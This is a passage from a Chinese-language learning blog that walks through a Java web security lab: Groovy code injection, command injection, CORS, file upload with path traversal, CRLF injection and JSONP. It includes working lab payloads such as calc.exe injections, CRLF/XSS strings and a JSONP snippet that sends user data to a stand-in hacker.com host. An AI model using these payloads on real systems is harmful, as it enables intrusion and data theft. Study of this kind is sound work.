代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。\nGroovyShell\nGroovyShell 是 Groovy 语言 提供的核心类，用于 动态解析和执行 Groovy 脚本。它可以像解释器一样直接运行 Groovy 代码，常用于脚本引擎、规则引擎或动态逻辑执行场景。\n也就是这个代码通过evaluate()方法可以执行Groovy代码\n任何合法的 Java 代码，几乎都可以直接在 Groovy 中运行（反之不成立）。\n也就是说我们直接执行java代码就行了\npayload\n?content=Runtime.getRuntime().exec(&#x27;calc.exe&#x27;)\n\n\n\n\n\n\n\n2.CommandInject命令执行结束后还是直接来进行命令注入，我们之前在学php的时候也遇到过命令注入，主要是通过命令分隔符等操作通过拼接执行命令\nWindows\n\n\n\n拼接符\n示例\n详解\n\n\n\n&amp;\na&amp;b\n无论a是否正确b都会执行\n\n\n&amp;&amp;\na&amp;&amp;b\n当a正确b才会执行\n\n\n||\na||b\na执行失败然后才执行b\n\n\n|\na|b\n表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行\n\n\nLinux\n\n\n\n拼接符\n详解\n\n\n\n|\n表示A命令语句的输出，作为B命令语句的输入执行。当A失败的时候将不会执行\n\n\n%0a\n应该是回车键的url编码，不知道为什么也可以用来作为命令分隔符\n\n\n&amp;\n后台运行\n\n\n&amp;&amp;\n当a正确b才会执行\n\n\n||\na||b\n\n\n（）\n如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用 圆括号()把所有命令组合起来,示例如下\n\n\n;\n将多个命令用;分隔开可以运行多个命令\n\n\n&#x2F;codeinject@GetMapping(&quot;/codeinject&quot;)    public String codeInject(String filepath) throws IOException &#123;        String[] cmdList = new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;dir &quot; + filepath&#125;;        ProcessBuilder builder = new ProcessBuilder(cmdList);        builder.redirectErrorStream(true);        Process process = builder.start();        return WebUtils.convertStreamToString(process.getInputStream());//将命令输出流转换为字符串返回给客户端    &#125;\n\n这个代码还是卡了我一下的，本来是一个很简单的命令分隔符，但是由于编码方面的问题，不知道是不是Windows的问题，会出现乱码的问题。但是这不是最重要的，就是我们的命令分隔符在url中属于特殊字符必须进行url编码不然就会返回400.\n然后就是靶场似乎会把命令执行后的输出直接固定在路由中输出了，重启才能刷新，导致有时候没有成功访问路径但是有回显\npaylod很简单，就是使用命令拼接符，但是需要注意不能未经编码就出现斜杠，反斜杠，竖杠等特殊字符，然后就是在访问后url会被解码，需要再次编码。这个也许和WIndows系统的路径分隔符是\\有关，会被解析为url的路径符，其他的估计也是有其他作用，也有可能和我使用的服务器是tomcat有关\npayload\n?filepath=D%3A%5Cphpstudy_pro%5CWWW%5Cregu%7Ccalc.exe\n\n我这里故意将地址写错，然后使用竖杠执行后面的命令\n\n\n\n\n&#x2F;codeinject&#x2F;host@GetMapping(&quot;/codeinject/host&quot;)    public String codeInjectHost(HttpServletRequest request) throws IOException &#123;//参数和以前不一样直接获取请求头        String host = request.getHeader(&quot;host&quot;);        logger.info(host);// 记录Host头到日志（可能泄露敏感信息）        String[] cmdList = new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;curl &quot; + host&#125;;//直接通过host拼接到参数        ProcessBuilder builder = new ProcessBuilder(cmdList);        builder.redirectErrorStream(true);        Process process = builder.start();        return WebUtils.convertStreamToString(process.getInputStream());    &#125;\n\n这个代码本来是可以进行拼接的，但是由于我使用的tomcat版本过高，对host传入的特殊字符&amp;|等命令分隔符存在过滤，url编码也不行，所以说目前我认为不存在命令注入\n&#x2F;codeinject&#x2F;sec@GetMapping(&quot;/codeinject/sec&quot;)    public String codeInjectSec(String filepath) throws IOException &#123;        String filterFilePath = SecurityUtil.cmdFilter(filepath);//对我们输入参数进行过滤        if (null == filterFilePath) &#123;            return &quot;Bad boy. I got u.&quot;;        &#125;        String[] cmdList = new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;dir /A &quot; + filterFilePath&#125;;        ProcessBuilder builder = new ProcessBuilder(cmdList);        builder.redirectErrorStream(true);        Process process = builder.start();        return WebUtils.convertStreamToString(process.getInputStream());    &#125;\n\n这个代码我们首先需要注意的就是对我们的输入多了一个过滤函数SecurityUtil.cmdFilter\nSecurityUtil.cmdFilter\nSecurityUtil.cmdFilter 是一个 输入过滤方法，用于拦截用户输入中的危险字符，防止命令注入漏洞。\n核心目标：阻止以下攻击：\n\n命令注入（如 &amp;、|、;）。\n路径遍历（如 ../、..\\）。\n特殊字符绕过（如反引号 &#96;&#96;&#96;、$()）。\n\nprivate static final Pattern FILTER_PATTERN = Pattern.compile(&quot;^[a-zA-Z0-9_/\\\\.-]+$&quot;);\n\n这里使用正则表达式进行匹配，是否只包含字母、数字、下划线、斜杠、点或破折号，如果是，则进行命令拼接运行，否则返回Bad boy. I got u\n这个由于我是在Windows环境下运行绝对路径对出现引号，而且用的还是反斜杠，导致绝对路径被过滤不能使用，但是这个代码就是文件读取命令，没什么好注入的\n3.Cookies靶场中这个好像没什么可以操作的地方，代码只是使用各种方式去获取我的Cookie然后进行输出，那也就介绍一下代码中使用到的函数吧\n@RestController@RequestMapping(&quot;/cookie&quot;)public class Cookies &#123;    private static String NICK = &quot;nick&quot;;    @GetMapping(value = &quot;/vuln01&quot;)    public String vuln01(HttpServletRequest req) &#123;        String nick = WebUtils.getCookieValueByName(req, NICK); // key code        return &quot;Cookie nick: &quot; + nick;    &#125;    @GetMapping(value = &quot;/vuln02&quot;)    public String vuln02(HttpServletRequest req) &#123;        String nick = null;        Cookie[] cookie = req.getCookies();        if (cookie != null) &#123;            nick = getCookie(req, NICK).getValue();  //这个我没找到这是什么代码，有可能是靶场自己写的一个静态类和方法        &#125;        return &quot;Cookie nick: &quot; + nick;    &#125;        //1和2两个路由都是属于直接获取cookie然后输出    @GetMapping(value = &quot;/vuln03&quot;)    public String vuln03(HttpServletRequest req) &#123;        String nick = null;        Cookie cookies[] = req.getCookies();        if (cookies != null) &#123;            for (Cookie cookie : cookies) &#123;//这个是java中增强版的for循环，用于遍历cookies数组 其中cookie为临时变量名                // key code. Equals can also be equalsIgnoreCase.                if (NICK.equals(cookie.getName())) &#123;//通过equals()方法判断两个字符串是否相等 不忽略大小写                    nick = cookie.getValue();                &#125;            &#125;        &#125;        return &quot;Cookie nick: &quot; + nick;    &#125;    @GetMapping(value = &quot;/vuln04&quot;)    public String vuln04(HttpServletRequest req) &#123;        String nick = null;        Cookie cookies[] = req.getCookies();        if (cookies != null) &#123;            for (Cookie cookie : cookies) &#123;                if (cookie.getName().equalsIgnoreCase(NICK)) &#123;  //还是比较字符串但是忽略大小写                    nick = cookie.getValue();                &#125;            &#125;        &#125;        return &quot;Cookie nick: &quot; + nick;    &#125;    @GetMapping(value = &quot;/vuln05&quot;)    public String vuln05(@CookieValue(&quot;nick&quot;) String nick) &#123;        return &quot;Cookie nick: &quot; + nick;    &#125;    @GetMapping(value = &quot;/vuln06&quot;)    public String vuln06(@CookieValue(value = &quot;nick&quot;) String nick) &#123;        return &quot;Cookie nick: &quot; + nick;    &#125;&#125;\n\n\n\nWebUtils.getCookieValueByName\nWebUtils.getCookieValueByName 是一个 从 HTTP 请求中获取指定名称的 Cookie 值 的实用方法，通常用于 Java Web 开发（如 Spring、Servlet 等框架）。\n至于WebUtils就是一个专门用来处理Web请求与相应的类\n\n输入：HTTP 请求对象 + Cookie 名称。\n输出：\n该 Cookie 的值（String 类型）。\n如果 Cookie 不存在，返回 null 或默认值（取决于实现）。\n\n\n典型用途：\n读取认证 Token（如 JSESSIONID）。\n获取用户偏好设置（如语言选择 lang=en）\n\n\n\ngetCookies()\n这个就很明显，直接获得当前的cookie，但是这个和getCookieValueByName不同的就是获得的是一个键值对数组\n返回值：\n\nCookie[] 数组：包含所有 Cookie 对象的数组。\n如果请求中没有 Cookie，返回 null。\n\n4.Cors跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。\n话说为什么之前都没碰到过这个漏洞啊，不好出CTF的题目吗\n在了解Cors之前我们需要知道SOP(同源策略)\nSOP(同源策略)\nSOP（Same-Origin Policy，同源策略） 是浏览器最核心的安全策略之一，用于限制不同源的文档或脚本之间的交互，防止恶意网站窃取用户数据或发起跨站攻击。\n两个URL的 协议（Protocol）、域名（Host）、端口（Port） 必须完全一致才属于同源。\n\n\n\nhttps://example.com/page\nhttps://example.com/other\n✅ 同源\n协议、域名、端口均相同\n\n\n\nhttp://example.com\nhttps://example.com\n❌ 不同源\n协议不同（HTTP vs HTTPS）\n\n\nhttps://example.com:443\nhttps://example.com:8080\n❌ 不同源\n端口不同\n\n\nhttps://sub.example.com\nhttps://example.com\n❌ 不同源\n子域名不同\n\n\n同源策略主要限制以下行为：\n\nDOM访问：禁止跨源读取DOM（如通过iframe.contentWindow访问其他页面的DOM）。\nCookie&#x2F;LocalStorage：禁止跨源读取Cookie或Web存储（但可通过document.cookie的SameSite属性放松限制）。\nAJAX请求：默认禁止跨源发送异步请求（需通过CORS机制绕过）。\nJavaScript API：某些API（如window.open()）受同源策略约束。\n\n虽然我都不知道该怎么读取这些东西，但是却把我禁了。\nCORS\nCORS（Cross-Origin Resource Sharing，跨源资源共享） 是浏览器基于HTTP头部的一种机制，用于在受控条件下放宽同源策略（SOP）的限制，允许跨源请求和响应。\n基本流程\n当浏览器检测到跨源请求（如AJAX、Fetch API）时，会自动附加以下头部，并检查服务器返回的响应头是否允许该请求：\n请求\n浏览器发送请求时，自动添加 Origin 头部，标明请求来源。\nGET /api/data HTTP/1.1Origin: https://your-site.com  # 浏览器自动添加\n\n响应\n服务器需返回明确的CORS头部（如 Access-Control-Allow-Origin），浏览器才会解除拦截。\nHTTP/1.1 200 OKAccess-Control-Allow-Origin: https://your-site.com  # 必须与请求的Origin一致Access-Control-Allow-Credentials: true  # 允许携带Cookie（可选）\n\n我们来看一些常见的CORS\n\n\n\n响应头\n作用\n\n\n\nAccess-Control-Allow-Origin\n指定允许的源（如 * 或 https://your-site.com）。\n\n\nAccess-Control-Allow-Methods\n允许的HTTP方法（如 GET, POST, PUT）。\n\n\nAccess-Control-Allow-Headers\n允许的自定义请求头（如 X-API-Key）。\n\n\nAccess-Control-Allow-Credentials\n是否允许携带Cookie（需请求头设置 credentials: &#39;include&#39;）。\n\n\nAccess-Control-Max-Age\n预检请求的缓存时间（秒）。\n\n\n也就是我们可以通过服务器返回的CORS头部获取信息\n要成功触发CORS漏洞，需要满足以下条件：\n\n服务器设置Access-Control-Allow-Origin头为通配符*或不安全地反射请求的Origin\n服务器设置Access-Control-Allow-Credentials: true(当需要窃取带凭证的敏感数据时)\n目标站点存在敏感信息或可执行敏感操作\n\n我们就能知道自己可以绕过同源策略去搞事情了\n&#x2F;vuln&#x2F;orgin\n@GetMapping(&quot;/vuln/origin&quot;)    public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;        String origin = request.getHeader(&quot;origin&quot;);        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); // set origin from header        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  // allow cookie        return info;    &#125;\n\n这个路由中设置了两个cors头，我们需要具体认识一下\nAccess-Control-Allow-Origin\n这个cors头后面接url，这个url必须和请求头中的origin一致才能让浏览器允许让该url指向网站的javascript读取响应\n如果后面接*则允许所有origin访问，但是不能和Access-Control-Allow-Credentials:ture共用。虽然不知道为什么，应该是因为当这种情况时任何网站（包括恶意站点evil.com）都能获取用户在某网站的登录态（Cookie）\nAccess-Control-Allow-Credentials\n这个后面接true和false，只有为true的时候才允许跨域请求携带凭证（如 Cookies、HTTP 认证、TLS 客户端证书等）访问跨域访问其他网站(也就是不同源网站)\n必须显式设置为 true 才允许携带凭证，默认情况下跨域请求不携带凭证。\n具体是否会携带凭证去访问不同源url，还需要由后端代码和前端设置，前提前端设置withCredentials: true。后端代码\n// 恶意网站代码 (https://attacker.com)fetch(&#x27;https://bank.com/api/transfer&#x27;, &#123;  method: &#x27;POST&#x27;,  credentials: &#x27;include&#x27;,  // 关键：要求携带Cookie  body: JSON.stringify(&#123;to: &#x27;hacker&#x27;, amount: 1000&#125;)&#125;);\n\n\n\n\n\n&#x2F;vuln&#x2F;setHeader\n@GetMapping(&quot;/vuln/setHeader&quot;)    public String vuls2(HttpServletResponse response) &#123;        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);        return info;    &#125;\n\n再前面我们可以知道Access-Control-Allow-Credentials:ture这个不能和origin*共存，相应的前端设置也不行\n后面的代码我感觉没什么重要的了，直接放源码看下\n@GetMapping(&quot;*&quot;)    @RequestMapping(&quot;/vuln/crossOrigin&quot;)    public String vuls3() &#123;        return info;    &#125;    /**     * 重写Cors的checkOrigin校验方法     * 支持自定义checkOrigin，让其额外支持一级域名     * 代码：org/joychou/security/CustomCorsProcessor     */    @CrossOrigin(origins = &#123;&quot;joychou.org&quot;, &quot;http://test.joychou.me&quot;&#125;)    @GetMapping(&quot;/sec/crossOrigin&quot;)    public String secCrossOrigin() &#123;        return info;    &#125;    /**     * WebMvcConfigurer设置Cors     * 支持自定义checkOrigin     * 代码：org/joychou/config/CorsConfig.java     */    @GetMapping(&quot;/sec/webMvcConfigurer&quot;)    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;        return token;    &#125;    /**     * spring security设置cors     * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行     * 代码：org/joychou/security/WebSecurityConfig.java     */    @GetMapping(&quot;/sec/httpCors&quot;)    public CsrfToken getCsrfToken_02(CsrfToken token) &#123;        return token;    &#125;    /**     * 自定义filter设置cors     * 支持自定义checkOrigin     * 代码：org/joychou/filter/OriginFilter.java     */    @GetMapping(&quot;/sec/originFilter&quot;)    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;        return token;    &#125;    /**     * CorsFilter设置cors。     * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行     * 代码：org/joychou/filter/BaseCorsFilter.java     */    @RequestMapping(&quot;/sec/corsFilter&quot;)    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;        return token;    &#125;    @GetMapping(&quot;/sec/checkOrigin&quot;)    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;        String origin = request.getHeader(&quot;Origin&quot;);        // 如果origin不为空并且origin不在白名单内，认定为不安全。        // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。        if (origin != null &amp;&amp; SecurityUtil.checkURL(origin) == null) &#123;            return &quot;Origin is not safe.&quot;;        &#125;        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);        return LoginUtils.getUserInfo2JsonStr(request);    &#125;\n\n\n\n5.FileUpload文件上传漏洞在php中可以太多了，除了普通的图片码之外还有伪协议和各种.htaccess文件操作\n我们之前有用过文件上传代码\n&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://c8001f1c-b35d-4d56-913a-fc27198a8ec9.node5.buuoj.cn:81/upload.php?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;&lt;!--name要根据题目的源码来调节--&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n可以看到进行文件上传我们只需要通过html代码进行表单提交即可，然后就是服务器端对收到的数据进行各种过滤和文件头匹配等\n&#x2F;upload@GetMapping(&quot;/any&quot;)    public String index() &#123;        return &quot;upload&quot;; // return upload.html page    &#125;@PostMapping(&quot;/upload&quot;)    public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,                                   RedirectAttributes redirectAttributes) &#123;//通过@RequestParam(&quot;file&quot;) MultipartFile file获取到提交的文件，将其各种信息放入MultipartFile对象中//RedirectAttributes redirectAttributes用于在重定向时传递临时数据        if (file.isEmpty()) &#123;            // 赋值给uploadStatus.html里的动态参数message            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);            return &quot;redirect:/file/status&quot;;//这个由于redirect:会触发重定向不会进行模板渲染  跳转到新地址/file/status        &#125;        try &#123;            // Get the file and save it somewhere            byte[] bytes = file.getBytes();//获取到文件的字节内容            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());//设置文件上传路径            Files.write(path, bytes);//进行文件写入            redirectAttributes.addFlashAttribute(&quot;message&quot;,                    &quot;You successfully uploaded &#x27;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#x27;&quot;);        &#125; catch (IOException e) &#123;            redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);            logger.error(e.toString());        &#125;        return &quot;redirect:/file/status&quot;;    &#125;\n\n由于这个类再一开始就使用@Controller修饰了，所以所有的方法都会进行视图寻找，所以我们访问/any实际上返回的是upload.html，然后upload.html又文件上传至\n&lt;form method=&quot;POST&quot; th:action=&quot;upload&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br/&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;\n\n**th:action=&quot;upload&quot;**这是 Thymeleaf 模板引擎的语法最终渲染时会自动添加 应用上下文路径（Context Path）,也就是127.0.0.1:8080/upload\n我们上传的文件保存路径为\nprivate static final String UPLOADED_FOLDER = &quot;/tmp/&quot;;Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());\n\nPath对象就是IoC容器，通过file.getOriginalFilename()获取到文件完整的名字\n看完这个代码，就是一个简单的文件上传代码，将文件储存到/tmp/目录下，然后返回路径，没有任何过滤\n我想上传webshell试一下，但是发现源码不仅存放文件上传的是linux路径，而且java项目通过URL访问的机制有点复杂反正这个框架我看不懂，应该是改了一下默认设置\n现在目测靶场是将\\src\\main\\resources\\static这个路径作为了静态目录，但是源代码中tmp是上传到项目根目录下的，我们无法直接访问到webshell，路由也得看Concroller目录下的控制器\n&#x2F;upload&#x2F;picture@GetMapping(&quot;/pic&quot;)    public String uploadPic() &#123;        return &quot;uploadPic&quot;; // return uploadPic.html page    &#125;@PostMapping(&quot;/upload/picture&quot;)    @ResponseBody//限定返回文本数据    public String uploadPicture(@RequestParam(&quot;file&quot;) MultipartFile multifile) throws Exception &#123;        if (multifile.isEmpty()) &#123;            return &quot;Please select a file to upload&quot;;        &#125;        String fileName = multifile.getOriginalFilename();        String Suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;)); // 获取文件后缀名        String mimeType = multifile.getContentType(); // 获取MIME类型        String filePath = UPLOADED_FOLDER + fileName;        //保存路径        File excelFile = convert(multifile);//这个代码应该是将上传文件转化为磁盘中的文件 先将其转化为File对象        // 判断文件后缀名是否在白名单内  校验1        String[] picSuffixList = &#123;&quot;.jpg&quot;, &quot;.png&quot;, &quot;.jpeg&quot;, &quot;.gif&quot;, &quot;.bmp&quot;, &quot;.ico&quot;&#125;;        boolean suffixFlag = false;        for (String white_suffix : picSuffixList) &#123;            if (Suffix.toLowerCase().equals(white_suffix)) &#123;//将上传文件后缀名改为小写 然后通过equals判断和白名单是否匹配                suffixFlag = true;                break;            &#125;        &#125;        if (!suffixFlag) &#123;            logger.error(&quot;[-] Suffix error: &quot; + Suffix);            deleteFile(filePath);            return &quot;Upload failed. Illeagl picture.&quot;;        &#125;//如果白名单未匹配到直接删除文件路径        // 判断MIME类型是否在黑名单内 校验2        String[] mimeTypeBlackList = &#123;                &quot;text/html&quot;,                &quot;text/javascript&quot;,                &quot;application/javascript&quot;,                &quot;application/ecmascript&quot;,                &quot;text/xml&quot;,                &quot;application/xml&quot;        &#125;;        for (String blackMimeType : mimeTypeBlackList) &#123;            // 用contains是为了防止text/html;charset=UTF-8绕过            if (SecurityUtil.replaceSpecialStr(mimeType).toLowerCase().contains(blackMimeType)) &#123;//SecurityUtil.replaceSpecialStr这是一个自定义方法，应该是过滤掉特殊字符                logger.error(&quot;[-] Mime type error: &quot; + mimeType);                deleteFile(filePath);                return &quot;Upload failed. Illeagl picture.&quot;;            &#125;        &#125;        // 判断文件内容是否是图片 校验3        boolean isImageFlag = isImage(excelFile);//没见过这个函数，也不知道怎么回事        deleteFile(randomFilePath);        if (!isImageFlag) &#123;            logger.error(&quot;[-] File is not Image&quot;);            deleteFile(filePath);            return &quot;Upload failed. Illeagl picture.&quot;;        &#125;        try &#123;            // Get the file and save it somewhere            byte[] bytes = multifile.getBytes();            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());            Files.write(path, bytes);        &#125; catch (IOException e) &#123;            logger.error(e.toString());            deleteFile(filePath);            return &quot;Upload failed&quot;;        &#125;//经过过滤后写入文件        logger.info(&quot;[+] Safe file. Suffix: &#123;&#125;, MIME: &#123;&#125;&quot;, Suffix, mimeType);        logger.info(&quot;[+] Successfully uploaded &#123;&#125;&quot;, filePath);        return String.format(&quot;You successfully uploaded &#x27;%s&#x27;&quot;, filePath);    &#125;//convert方法 返回File对象private File convert(MultipartFile multiFile) throws Exception &#123;        String fileName = multiFile.getOriginalFilename();        String suffix = fileName.substring(fileName.lastIndexOf(&quot;.&quot;));//将文件后缀提取出来        UUID uuid = Generators.timeBasedGenerator().generate();//基于时间生成的UUID作为文件名        randomFilePath = UPLOADED_FOLDER + uuid + suffix;        // 随机生成一个同后缀名的文件        File convFile = new File(randomFilePath);        boolean ret = convFile.createNewFile();//调用File类的creatNewFile();创建当前类指向的空文件        if (!ret) &#123;            return null;        &#125;        FileOutputStream fos = new FileOutputStream(convFile);//为这个文件创建写入流        fos.write(multiFile.getBytes());//将文件数据写入文件        fos.close();        return convFile;    &#125;\n\n/upload/picture这个路由就明显有点东西了，过滤掉了不少东西。由于模板渲染，我们直接访问uploadPic即可进行文件上传\n我们可以看到比未过滤的路由不同的是，这次对multiFile，不是直接写入，而是通过一个convert的方法去生成临时文件，然后遇到被过滤的情况就会通过delet方法删除临时文件\n然后我有一个就看不懂了，就是为什么convert生成的临时文件为UUID拼接而成，但是delete删除的却是filtpath这个原文件名的文件路径，不知道这是为什么，试一下就知道了\n\n\n可以看到，即使被过滤了，我们还是可以直接上传到&#x2F;tmp目录下，看来好像真的代码写错了，这就是著名的逻辑漏洞吗\n这个代码就属于修复代码，我现在也是无法上传webshell了\n文件上传已经结束了，之前那个属于逻辑漏洞，我们可以上传webshell但是无法访问，但是还有目录跨越漏洞，我们可以注意到下面代码\ntry &#123;            // Get the file and save it somewhere            byte[] bytes = multifile.getBytes();            Path path = Paths.get(UPLOADED_FOLDER + multifile.getOriginalFilename());            Files.write(path, bytes);        &#125; catch (IOException e) &#123;            logger.error(e.toString());            deleteFile(filePath);            return &quot;Upload failed&quot;;        &#125;//这个直接拼接了文件名存在目录跨越漏洞\n\n这个目录跨越漏洞可以使我们将文件上传至静态目录访问到，但是只能上传图片\n我们将文件名改为\n..\\src\\main\\resources\\static\\1.png//Windows路径\n\n由于使用了**ImageIO.read(file)**，我只能使用一张真正的图片了\n\n\n成功上传，可以直接在静态目录访问，但是加载项目结构需要我重启靶场\n\n\n成功通过静态目录访问上传图片\n6.CRLFInjectionCRLF是”回车+换行”(\\r\\n)(编码后是%0D%0A)的简称,在HTTP中,HTTP Header和HTTP Body是用两个CRLF来分割的。浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。\n我才知道回车和换行是两个东西，回车指的是回到行首，换行指的是移动到下一行\n\n\n\n系统\n换行符\n示例\n\n\n\nUnix&#x2F;Linux\n\\n (LF)\nHello\\nWorld\n\n\nWindows\n\\r\\n (CR+LF)\nHello\\r\\nWorld\n\n\n旧版 Mac\n\\r (CR)\nHello\\rWorld\n\n\n假如我们可以操控http头中的部分，那么我们就可能实现CRLF注入，我们以最常见的重定向为例:假如我们可以在url后面输入参数作为302重定向的对象,假如对于一个正常的\nhttp://test.com/?url=http://www.baidu.com \n\n响应头为\nHTTP/1.1 302 Moved Temporarily Date: Wed, 29 Jan 2020 20:40:17 GMT Content-Type: text/html Connection: close Location: http://www.baidu.com\n\n但是，如果我们构造这样的url:\nhttp://test.com/?url=http://www.baidu.com%0aSet_cookie:sessionid=V0n \n\n此时响应头就会变成:\nHTTP/1.1 302 Moved Temporarily Date: Wed, 29 Jan 2020 20:43:33 GMT Content-Type: text/html Connection: close Location: http://www.baidu.com cookie: sessionid=V0n \n\n可以看到，此时cookie已经被我们设定成为了一个特定值，也就是形成了一个会话维持漏洞。\n但是这个会话维持漏洞只是会在响应头中Set_Cookie让我们浏览器储存Cookie然后持久性发送。感觉和我每次自己伪造Cookie没什么区别只是方便一点\n在什么的例子中,我们以%0a分割Set_cookie和重定向网站，只是为了实现设置Http Header，而如果我们设置url为:\nhttp://test.com/?url=http://www.baidu.com%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;\n\n那么我们的响应头将会变成:\nHTTP/1.1 302 Moved Temporarily Date: Wed, 29 Jan 2020 20:49:33 GMTContent-Type: text/html Content-Length: 154 Connection: close Location:&lt;img src=1 onerror=alert(/xss/)&gt;\n\n实现了一个XSS漏洞，但是反射型的XSS还是没有什么用啊\n我们来看靶场的代码\n@Controller@RequestMapping(&quot;/crlf&quot;)public class CRLFInjection &#123;    @RequestMapping(&quot;/safecode&quot;)    @ResponseBody    public void crlf(HttpServletRequest request, HttpServletResponse response) &#123;        response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;));//addHeader设置响应头  可以在响应头中设置多个同名字段不会进行覆盖        response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;));//setHeader设置响应头，会对原有字段进行覆盖，只保留新字段        String author = request.getParameter(&quot;test3&quot;);        Cookie cookie = new Cookie(&quot;test3&quot;, author);        response.addCookie(cookie);//响应头添加cookie    &#125;&#125;\n\n我们可以看到这个代码会将我们的参数test放到响应头中，还会将test3放入Set_Cookie中\n但这个问题实际上已经在所有的现在的java EE应用服务器上修复了。如果你想关注这个漏洞，你应该在目标平台测试是否允许将CRLF插入到HTTP头中。不出意外的话，这个漏洞已经在大部分的目前的应用服务器上修复了，无论是用什么语言编写的。\n我们也是尝试一下\n\n\n注意到并没有换行，也是一个快消失的漏洞啊\n7.JsonpJsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。\n我们之前在写Cors的时候知道当我们想要从一个网站向非同源网站请求数据的时候就需要使用Cors绕过同源策略，才能获取请求数据。\nJsonp则可以直接不管同源策略进行数据获取，利用的就是&lt;script&gt;标签不受同源策略限制，通过动态插入 &lt;script&gt; 的方式间接获取跨域数据。\nJSONP（JSON with Padding） 的核心机制就是：\n\n客户端 提前定义一个回调函数（如 handleData）。\n客户端 通过 &lt;script&gt; 标签请求服务器，并在 URL 中指定回调函数名（如 ?callback=handleData）。\n服务器 返回的数据不是纯 JSON，而是一段 JS 代码，格式为：\n\nhandleData(&#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 25&#125;);  // 用客户端指定的函数名包裹 JSON 数据\n\n浏览器加载这段 JS 代码后，会自动执行 handleData 函数，客户端就能在函数内部处理数据了。\n我们需要注意的是Jsonp只能在GET请求下使用，所以我们客户端需要在URL中指定回调函数名\n也就是说我们返回的数据实际上是服务器端返回的json数据经过我们GET传递函数名称的执行结果\n我们可以利用这个JSONP漏洞伪造钓鱼网站，当你点击钓鱼网站时，触发JSONP向目标网站请求数据，由于你的浏览器自带Cookie，然后再触发js代码，将你的信息发送到黑客的服务器实现CSRF攻击完成信息泄露\n&lt;script src=&quot;https://social.com/userinfo?callback=sendToHacker&quot;&gt;&lt;/script&gt;&lt;script&gt;function sendToHacker(data) &#123;    fetch(&quot;https://hacker.com/log?data=&quot; + JSON.stringify(data));&#125;&lt;/script&gt;\n\n还有利用JSON参数和函数进行XSS攻击等。\n我们先来看下没有经过任何过滤的代码\n@RequestMapping(value = &quot;/vuln/referer&quot;, produces = &quot;application/javascript&quot;)//produces这个参数用于MVC规定返回的content-type    public String referer(HttpServletRequest request) &#123;        String callback = request.getParameter(this.callback);        return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));    &#125;\n\n这个就是直接获取了我们URL中的callback函数名，然后有\nreturn WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));//LoginUtils.getUserInfo2JsonStr(request)应该是获取json数据\n\n这个代码进行一个js代码的返回，由于这个不是java自带的函数我只能猜测其用法\n//假设 WebUtils.json2Jsonp() 的实现如下：public static String json2Jsonp(String callback, String jsonStr) &#123;    return callback + &quot;(&quot; + jsonStr + 